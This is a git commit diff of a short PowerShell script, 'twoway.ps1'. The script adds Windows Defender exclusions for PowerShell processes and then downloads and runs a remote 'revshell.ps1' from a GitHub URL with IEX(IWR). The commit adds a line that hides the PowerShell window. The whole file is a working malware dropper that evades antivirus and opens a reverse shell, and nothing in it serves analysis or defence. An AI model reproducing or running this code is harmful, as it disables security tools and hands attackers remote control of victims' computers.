7ae45789e142f2b4906d81b0854fdefcc08361b1
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-04-09 19:34:47 -0700

    Update twoway.ps1

--- twoway.ps1
+++ twoway.ps1
@@ -1,3 +1,4 @@
 Add-MpPreference -ExclusionProcess "powershell.exe"
 Add-MpPreference -ExclusionProcess "pwsh.exe"
+powershell -windowstyle hidden
 IEX(IWR https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/revshell.ps1 -UseBasicParsing)
